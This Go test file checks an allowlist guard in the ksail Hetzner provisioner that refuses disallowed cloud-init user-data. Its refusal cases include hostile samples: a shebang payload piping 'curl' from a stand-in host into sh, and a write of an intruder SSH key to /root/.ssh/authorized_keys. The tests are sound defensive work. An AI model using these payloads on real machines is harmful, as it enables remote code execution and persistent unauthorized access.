package hetznerbase_test

import (
	"fmt"
	"strings"
	"testing"

	cloudinitbootstrap "github.com/devantler-tech/ksail/v7/pkg/svc/bootstrap/cloudinit"
	containerdbootstrap "github.com/devantler-tech/ksail/v7/pkg/svc/bootstrap/containerd"
	kubeadmbootstrap "github.com/devantler-tech/ksail/v7/pkg/svc/bootstrap/kubeadm"
	"github.com/devantler-tech/ksail/v7/pkg/svc/provisioner/cluster/internal/hetznerbase"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// deriveWithUserData runs the provider-boundary guard over one document by
// putting it on the worker node of the standard two-node pair.
func deriveWithUserData(t *testing.T, userData string) error {
	t.Helper()

	nodes := twoNodeSpecs()
	nodes[1].UserData = userData

	_, err := hetznerbase.DeriveServerSpecs(
		specTestClusterName, nodes, specTestOptions(), specTestInfra(),
	)
	if err != nil {
		return fmt.Errorf("derive server specs: %w", err)
	}

	return nil
}

// TestDeriveServerSpecsRefusesTargetNoDenylistWouldEnumerate is the point of the
// allowlist: it refuses by TARGET rather than by spelling, so it covers a class
// the denylist was never designed for.
//
// `/root/.ssh/authorized_keys` is not signing material, so no signing-transport
// denylist would ever list it -- yet writing it hands out persistent access to
// every node. The content is inert, and the assertion is on the SHAPE sentinel
// specifically, so a refusal that came from the PEM or transport guard instead
// would fail this test rather than silently satisfy it.
func TestDeriveServerSpecsRefusesTargetNoDenylistWouldEnumerate(t *testing.T) {
	t.Parallel()

	err := deriveWithUserData(t, `#cloud-config
write_files:
  - path: /root/.ssh/authorized_keys
    permissions: "0600"
    content: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIintruder
`)

	require.Error(t, err)
	require.ErrorIs(t, err, hetznerbase.ErrUserDataShapeNotAllowed)
}

// TestDenylistAloneMissesTheNovelTarget is the CONTROL for the test above. The
// same inert key material carried on an ALLOWLISTED path is accepted, which
// demonstrates that neither the PEM guard nor the transport guard reacts to the
// CONTENT. Without it, the refusal above could be the denylist firing and the
// allowlist would be proven nothing.
func TestDenylistAloneMissesTheNovelTarget(t *testing.T) {
	t.Parallel()

	err := deriveWithUserData(t, `#cloud-config
write_files:
  - path: `+kubeadmbootstrap.ConfigPath+`
    permissions: "0600"
    content: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIintruder
`)

	require.NoError(t, err)
}

// TestDeriveServerSpecsRefusesUnknownTopLevelKey covers the module surface. The
// renderers emit a closed set of cloud-config keys; `bootcmd` is a real
// cloud-init module that runs arbitrary commands earlier than `runcmd`, and
// nothing in ksail emits it, so it must not reach the provider whatever it
// contains.
func TestDeriveServerSpecsRefusesUnknownTopLevelKey(t *testing.T) {
	t.Parallel()

	err := deriveWithUserData(t, `#cloud-config
bootcmd:
  - echo hello
`)

	require.ErrorIs(t, err, hetznerbase.ErrUserDataShapeNotAllowed)
}

// TestDeriveServerSpecsRefusesForeignRunCmd pins the one shape runcmd is
// allowed to take. The renderers emit exactly `/bin/sh <script>` in argv form,
// so any other command is outside what a bring-up produces.
func TestDeriveServerSpecsRefusesForeignRunCmd(t *testing.T) {
	t.Parallel()

	err := deriveWithUserData(t, `#cloud-config
runcmd:
  - ["/bin/sh", "/tmp/not-our-script.sh"]
`)

	require.ErrorIs(t, err, hetznerbase.ErrUserDataShapeNotAllowed)
}

// TestDeriveServerSpecsAcceptsRenderedUserData is the GUARDRAIL: the allowlist
// is derived from what the renderers emit, so their real output must pass. This
// builds the document through the actual renderer rather than restating its
// shape in a fixture, so a renderer change that outgrows the allowlist fails
// here instead of at a real bring-up.
func TestDeriveServerSpecsAcceptsRenderedUserData(t *testing.T) {
	t.Parallel()

	rendered, err := cloudinitbootstrap.BuildUserData(cloudinitbootstrap.Config{
		Commands: []string{"echo bootstrapping"},
		Packages: []string{"kubelet"},
		Files: []cloudinitbootstrap.File{
			{Path: containerdbootstrap.ConfigPath, Content: "version = 2"},
			{Path: kubeadmbootstrap.ConfigPath, Content: "kind: ClusterConfiguration"},
		},
		AptSources: []cloudinitbootstrap.AptSource{
			{Name: "kubernetes", Source: "deb https://pkgs.k8s.io/core:/stable:/v1.34/deb/ /"},
		},
		SSHAuthorizedKeys: []string{"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexample"},
	})
	require.NoError(t, err)
	require.True(t, strings.HasPrefix(rendered, "#cloud-config"))

	assert.NoError(t, deriveWithUserData(t, rendered))
}

// TestDeriveServerSpecsRefusesShebangUserData closes the hole a mapping-only
// walk leaves open. cloud-init treats user-data beginning `#!` as a SHELL
// SCRIPT and executes it, and YAML decodes such a payload as a bare scalar
// document — not a mapping. A guard that only inspects mappings therefore waves
// through the single most dangerous shape there is.
//
// Verified against the decoder rather than assumed: `#!/bin/sh\ncurl … | sh`
// yields one document whose root is a `!!str` scalar.
func TestDeriveServerSpecsRefusesShebangUserData(t *testing.T) {
	t.Parallel()

	err := deriveWithUserData(t, "#!/bin/sh\ncurl http://example.invalid/x | sh\n")

	require.ErrorIs(t, err, hetznerbase.ErrUserDataShapeNotAllowed)
}

// TestDeriveServerSpecsRefusesSequenceRoot is the same hole in its other
// spelling: a sequence root is not a mapping either, and the renderers never
// emit one.
func TestDeriveServerSpecsRefusesSequenceRoot(t *testing.T) {
	t.Parallel()

	err := deriveWithUserData(t, "#cloud-config\n- one\n- two\n")

	require.ErrorIs(t, err, hetznerbase.ErrUserDataShapeNotAllowed)
}

// TestDeriveServerSpecsRefusesRunCmdExecutingAConfigFile separates the WRITE
// allowlist from the EXECUTE allowlist. The renderers write three paths but
// only ever execute one of them — the generated boot script. Allowing runcmd to
// name any writable target lets shell content be written to a config path and
// then run from it, which is a shape no bring-up produces.
func TestDeriveServerSpecsRefusesRunCmdExecutingAConfigFile(t *testing.T) {
	t.Parallel()

	err := deriveWithUserData(t, `#cloud-config
runcmd:
  - ["/bin/sh", "`+containerdbootstrap.ConfigPath+`"]
`)

	require.ErrorIs(t, err, hetznerbase.ErrUserDataShapeNotAllowed)
}

// TestDeriveServerSpecsAcceptsCommentOnlyUserData is the GUARDRAIL for the two
// refusals above: tightening the root check must not start refusing the
// comment-only document the provisioners emit for a node with no directives.
// Such a payload decodes to NO documents at all, so it never reaches the shape
// walk — pinned here so a future "reject non-mapping roots" refactor cannot
// quietly break it.
func TestDeriveServerSpecsAcceptsCommentOnlyUserData(t *testing.T) {
	t.Parallel()

	require.NoError(t, deriveWithUserData(t, "#cloud-config\n# worker\n"))
}
